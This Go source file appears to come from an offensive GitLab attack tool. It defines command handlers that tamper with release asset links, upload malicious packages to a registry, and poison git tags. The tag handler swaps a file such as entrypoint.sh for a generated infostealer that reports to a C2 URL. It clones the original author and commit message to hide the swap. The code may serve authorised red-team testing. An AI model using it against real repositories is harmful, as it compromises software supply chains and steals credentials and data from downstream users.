package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	"github.com/mr-pmillz/gogatoz/pkg/attack/tamper"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/spf13/cobra"
)

// runAttackTamperRelease modifies release metadata and/or replaces asset links.
func runAttackTamperRelease(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	tagName := strings.TrimSpace(atkTagName)
	if tagName == "" {
		return fmt.Errorf("--tag-name is required for --tamper-release")
	}
	opts := tamper.TamperReleaseOptions{
		NewName:        strings.TrimSpace(atkReleaseName),
		NewDescription: strings.TrimSpace(atkReleaseDesc),
	}
	if ln := strings.TrimSpace(atkLinkName); ln != "" && strings.TrimSpace(atkLinkURL) != "" {
		opts.ReplaceLinks = map[string]string{ln: strings.TrimSpace(atkLinkURL)}
	}
	if an := strings.TrimSpace(atkAddLinkName); an != "" && strings.TrimSpace(atkAddLinkURL) != "" {
		opts.AddLinks = map[string]string{an: strings.TrimSpace(atkAddLinkURL)}
	}
	replaced, added, err := tamper.TamperRelease(ctx, client, atkTarget, tagName, opts)
	if err != nil {
		return err
	}
	if outputJSON {
		out := struct {
			TagName  string `json:"tag_name"`
			Replaced int    `json:"links_replaced"`
			Added    int    `json:"links_added"`
		}{TagName: tagName, Replaced: replaced, Added: added}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Tampered release %s: %d links replaced, %d added", tagName, replaced, added))
	return nil
}

// runAttackTamperPackage uploads a malicious package to the Generic Packages registry.
func runAttackTamperPackage(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	pkgName := strings.TrimSpace(atkPackageName)
	pkgVer := strings.TrimSpace(atkPackageVer)
	pkgFile := strings.TrimSpace(atkPackageFile)
	if pkgName == "" || pkgVer == "" || pkgFile == "" {
		return fmt.Errorf("--package-name, --package-version, and --package-file are required for --tamper-package")
	}
	f, err := os.Open(pkgFile)
	if err != nil {
		return fmt.Errorf("open --package-file: %w", err)
	}
	defer f.Close()
	fileName := filepath.Base(pkgFile)
	result, err := tamper.PublishPackage(ctx, client, atkTarget, pkgName, pkgVer, fileName, f)
	if err != nil {
		return err
	}
	if outputJSON {
		b, _ := json.MarshalIndent(result, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Published %s/%s/%s", result.PackageName, result.PackageVersion, result.FileName))
	if result.URL != "" {
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("URL: %s", result.URL))
	}
	return nil
}

// runAttackTamperTag poisons a git tag with a modified file tree (Trivy-style supply chain attack).
func runAttackTamperTag(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	tagName := strings.TrimSpace(atkTagName)
	if tagName == "" {
		return fmt.Errorf("--tag-name is required for --tamper-tag")
	}

	// Resolve payload content
	payload := strings.TrimSpace(atkTamperTagPayload)
	if payload == "" && strings.TrimSpace(atkTamperTagPayloadFile) != "" {
		b, perr := os.ReadFile(strings.TrimSpace(atkTamperTagPayloadFile))
		if perr != nil {
			return fmt.Errorf("read --tamper-tag-payload-file: %w", perr)
		}
		payload = string(b)
	}

	// If --tamper-tag-preserve-original, fetch original file content
	var originalContent string
	if atkTamperTagOriginal && payload == "" {
		att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
		targetFile := strings.TrimSpace(atkTamperTagFile)
		if targetFile == "" {
			targetFile = "entrypoint.sh"
		}
		orig, ferr := att.GetFileContent(ctx, atkTarget, tagName, targetFile)
		if ferr == nil {
			originalContent = orig
		}
	}

	// If no explicit payload, generate an infostealer
	if payload == "" {
		c2 := strings.TrimSpace(atkTamperTagC2)
		if c2 == "" {
			c2 = strings.TrimSpace(atkWebhook)
		}
		if c2 == "" {
			return fmt.Errorf("--tamper-tag-c2 or --webhook is required when no explicit payload is provided for --tamper-tag")
		}
		var rsaPubKey string
		if f := strings.TrimSpace(atkTamperTagRSAPubFile); f != "" {
			b, rerr := os.ReadFile(f)
			if rerr != nil {
				return fmt.Errorf("read --tamper-tag-rsa-pub: %w", rerr)
			}
			rsaPubKey = string(b)
		}
		payload = payloadgen.GenerateInfostealerScript(payloadgen.InfostealerOptions{
			C2URL:           c2,
			EncryptionKey:   strings.TrimSpace(atkTamperTagEncKey),
			RSAPubKey:       rsaPubKey,
			BackupExfilRepo: strings.TrimSpace(atkTamperTagBackup),
			OriginalContent: originalContent,
			ProcScan:        atkTamperTagProcScan,
			MemoryDump:      atkTamperTagMemDump,
			Extended:        atkTamperTagExtended,
		})
	} else if atkTamperTagOriginal && originalContent != "" {
		// Explicit payload with --tamper-tag-preserve-original: append original after payload
		payload = payload + "\n# === ORIGINAL SCRIPT CONTENT ===\n" + originalContent
	}

	result, terr := tamper.TamperTag(ctx, client, atkTarget, tamper.TamperTagOptions{
		TagName:        tagName,
		TargetFile:     strings.TrimSpace(atkTamperTagFile),
		PayloadContent: payload,
		SourceRef:      strings.TrimSpace(atkTamperTagSource),
		AuthorName:     atkAuthorName,
		AuthorEmail:    atkAuthorEmail,
	})
	if terr != nil {
		return terr
	}

	if outputJSON {
		b, _ := json.MarshalIndent(result, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}
	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Poisoned tag %s: %s -> %s",
		result.TagName, result.OriginalCommitSHA[:12], result.NewCommitSHA[:12]))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Swapped file: %s", result.TargetFile))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Cloned author: %s", result.ClonedAuthor))
	renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Cloned message: %s", strings.SplitN(result.ClonedMessage, "\n", 2)[0]))
	return nil
}
